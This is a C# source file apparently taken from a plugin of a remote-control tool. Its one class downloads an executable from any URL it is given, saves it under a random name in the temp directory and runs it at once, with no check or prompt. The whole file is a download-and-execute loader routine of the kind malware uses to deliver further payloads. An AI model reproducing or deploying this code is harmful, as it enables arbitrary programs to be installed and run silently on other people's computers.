using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace Plugin.Handler
{
    internal class HandleDownloadFromUrl
    {
        private static readonly Random random = new Random();
        public static string chars = "ABCDEFGHIJKLMNOPQRSTUWVXYZ0123456789abcdefghijklmnopqrstuvwxyz";

        public void Start(string url)
        {
            string tmppath;
            using (var client = new WebClient())
            {
                var filename = radomstrs(chars, 8);
                tmppath = Path.Combine(Environment.GetEnvironmentVariable("TMP"), filename + ".exe");
                client.DownloadFile(url, tmppath);
            }

            Process.Start(tmppath);
        }

        public static string radomstrs(string chars, int length)
        {
            var strs = string.Empty;
            for (var i = 0; i < length; i++) strs += chars[random.Next(chars.Length)];
            return strs;
        }
    }
}